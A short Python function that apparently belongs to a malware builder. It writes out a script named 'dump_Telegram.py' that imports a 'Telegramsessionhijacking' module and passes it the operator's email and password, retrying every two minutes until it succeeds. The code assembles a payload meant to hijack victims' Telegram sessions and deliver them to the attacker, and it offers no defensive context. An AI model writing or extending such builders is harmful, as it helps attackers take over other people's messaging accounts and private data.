def build_t(email,Password):
	with open("dump_Telegram.py","w+") as file:
		file.write("from modules_version2.Telegramsessionhijacking import MainfinTelegram\n")
		file.write("from time import sleep\n")
		file.write("TR = MainfinTelegram()")
		file.write("""
def run():
	while 1:
		try:
			TT = MainfinTelegram()
			""")
		file.write("TT.urlparse("+"'"+email + "'" +"," + "'" + Password +"'" + ")" + "\n")
		file.write("""
			break
		except Exception:
			sleep(120)
			""")
		file.write(""" 
run()
	""")
		file.close()
